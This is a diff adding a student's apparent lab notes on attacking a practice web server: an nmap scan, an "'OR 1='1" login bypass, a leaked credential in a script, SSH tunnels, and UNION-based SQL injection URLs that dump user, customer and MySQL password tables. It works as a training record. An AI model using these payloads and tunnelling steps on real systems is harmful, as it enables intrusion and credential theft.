@@ -1,0 +1,90 @@
+Found site -> 10.50.28.45:80
+
+Nmap found this:
+student@lin-ops:~$ nmap -Pn -T4 -sT --min-rate=6546847 10.50.28.45 -p80 --script=http-enum
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-14 12:42 UTC
+Nmap scan report for 10.50.28.45
+Host is up (0.0038s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+
+10.50.28.45/login.html --> login page
+	user: 'OR 1='1
+	pass: 'OR 1='1 
+	led to a page /login.php -> "welcome Aaron" -> Aaron might be an Admin
+
+10.50.28.45/scripts/ --> link on page downloaded a terminal message
+###
+#!/usr/bin/python3
+
+import os
+
+system_user=user2
+user_password=EaglesIsARE78
+
+
+
+##Developer note
+
+#script will eventually take above system user credentials and run automated services
+###
+Was able to ssh to it straight from lin-ops, may be useful later (its the public facing site)
+
+user2 was able to access /etc/host -> found 192.168.28.181
+new tunnels: (nmap scan shows it has 22 and 80 open)
+student@lin-ops:~$ ssh -S /tmp/gray dummy -O forward -L1111:192.168.28.181:80
+student@lin-ops:~$ ssh -S /tmp/gray dummy -O forward -D9050
+
+url: localhost:1111 -> catalogue database, page source says it uses GET requests; we need to use Gold.txt
+
+http://localhost:1111/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+- Out of all 9 products, only the page for product=7 worked
+
+http://localhost:1111/pick.php?product=7 UNION SELECT id,name,account FROM customer;#
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	123558  $Lockheed Martin
+2 	14744 	$Boeing
+3 	117 	$General Dynamics
+4 	33699 	$Northrop Grumman
+5 	55487 	$ManTech International
+
+http://localhost:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM users;#
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+Found:
+user: Lee_Roth pass: anotherpassword4THEages
+user: Aaron pass: ncnffjbeqlCn$$jbeq
+user: user2 pass: RntyrfVfNER78
+user: user3 pass: Obo4GURRnccyrf
+These gain access to the accounts on .28.45's webpage but not for creating ssh sessions
+
+http://localhost:1111/pick.php?product=7 UNION SELECT Host,User,Password FROM mysql.user;#
+Item 	On Hand 	Price
+HAM 	                            32 	                  $15
+localhost 		                                        $root
+localhost 	*BF207353FF1EAA9EBA7DD87E37E6D278746F17CD 	$webuser
+Found: Nothing
+
+
+
+
+
+
+
